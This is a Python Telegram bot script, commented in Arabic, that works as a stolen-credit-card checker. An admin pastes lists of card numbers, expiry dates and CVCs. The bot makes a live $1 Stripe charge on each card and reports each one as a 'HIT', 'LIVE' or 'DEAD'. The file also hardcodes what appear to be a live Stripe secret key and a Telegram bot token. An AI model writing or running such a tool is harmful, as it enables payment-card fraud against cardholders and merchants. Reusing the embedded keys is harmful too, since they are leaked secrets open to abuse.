import stripe
import telebot
import os
import http.server
import socketserver
from threading import Thread

# 1. إعداد سيرفر فوري جداً لإرضاء Render
def run_health_server():
    PORT = 10000
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Health check server started on port {PORT}")
        httpd.serve_forever()

# تشغيل السيرفر في خيط مستقل فوراً عند بداية التشغيل
Thread(target=run_health_server, daemon=True).start()

# 2. بيانات المحرك والبوت
stripe.api_key = "sk_live_awWzIlT3bp7cGsy4Ord9cRU0"
bot = telebot.TeleBot("8551972896:AAFOysETMd4tuyuArnqPA8-uM2Iz6z4fWuw")
ADMIN_ID = 5473153501

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ <b>البوت أونلاين الآن!</b>\nأرسل اللستة وسأقوم بفحصها فوراً.", parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    if message.from_user.id != ADMIN_ID: return
    
    cards = message.text.strip().split('\n')
    status_msg = bot.reply_to(message, f"⏳ جاري فحص {len(cards)} بطاقة...")
    stats = {"hit": 0, "live": 0, "dead": 0}

    for card in cards:
        try:
            card_clean = card.strip().replace(" ", "")
            if "|" not in card_clean: continue
            num, mm, yy, cvc = card_clean.split('|')
            
            # عملية الفحص الحقيقي
            stripe.Charge.create(
                amount=100, currency="usd",
                source={"object": "card", "number": num, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvc}
            )
            stats["hit"] += 1
            bot.send_message(message.chat.id, f"✅ <b>HIT!</b>\n<code>{card_clean}</code>", parse_mode="HTML")
        except stripe.error.CardError as e:
            err = e.json_body.get('error', {})
            if err.get('code') == "insufficient_funds":
                stats["live"] += 1
                bot.send_message(message.chat.id, f"✔️ <b>LIVE</b>\n<code>{card_clean}</code>", parse_mode="HTML")
            else: stats["dead"] += 1
        except Exception: stats["dead"] += 1

    bot.edit_message_text(f"🏁 <b>اكتمل الفحص!</b>\n\n✅ HITS: {stats['hit']}\n⚡ LIVE: {stats['live']}\n💀 DEAD: {stats['dead']}", message.chat.id, status_msg.message_id, parse_mode="HTML")

# 3. بدء تشغيل البوت
if __name__ == "__main__":
    print("Starting Telegram Bot...")
    bot.infinity_polling()
